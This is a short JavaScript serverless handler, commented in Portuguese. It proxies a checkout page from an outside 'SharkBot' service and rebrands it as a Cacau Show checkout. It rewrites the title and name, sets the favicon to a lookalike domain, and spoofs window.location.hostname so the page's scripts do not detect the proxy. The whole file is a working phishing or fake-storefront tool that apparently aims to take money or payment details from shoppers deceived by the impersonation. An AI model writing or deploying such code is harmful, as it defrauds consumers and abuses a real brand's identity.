export default async function handler(req, res) {
  const BASE_URL = "https://phantoms.group";
  const TARGET_URL = `${BASE_URL}/l/cacaushow?shk=f4jzf8lf`;

  try {
    const response = await fetch(TARGET_URL, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
      }
    });

    let html = await response.text();

    // 1. REMOVE O NOME SHARKBOT DA ABA E DO TÍTULO
    html = html.replace(/<title>.*?<\/title>/gi, "<title>Cacau Show | Checkout</title>");
    html = html.replace(/Shark Bot/gi, "Cacau Show");
    html = html.replace(/SharkBot/gi, "Cacau Show");

    // 2. TROCA O ÍCONE (FAVICON) PELA LOGO DA CACAU SHOW
    html = html.replace(/rel="icon".*?>/gi, 'rel="icon" href="https://cacaushow-br.shop/logo.png">');
    html = html.replace(/rel="shortcut icon".*?>/gi, 'rel="shortcut icon" href="https://cacaushow-br.shop/logo.png">');

    // 3. INJETA A REGRA PARA CARREGAR IMAGENS E CSS DO SITE ORIGINAL
    // Isso evita o erro de "This page couldn't load"
    const baseTag = `<base href="${BASE_URL}/l/">`;
    html = html.replace('<head>', `<head>${baseTag}`);

    // 4. LIMPEZA DE SCRIPTS QUE PODEM DESCOBRIR O PROXY
    html = html.replace(/window.location.hostname/g, "'teste.cacaushow-br.shop'");

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    return res.status(200).send(html);

  } catch (error) {
    return res.status(500).send("Ocorreu um erro ao carregar o checkout. Tente novamente.");
  }
}
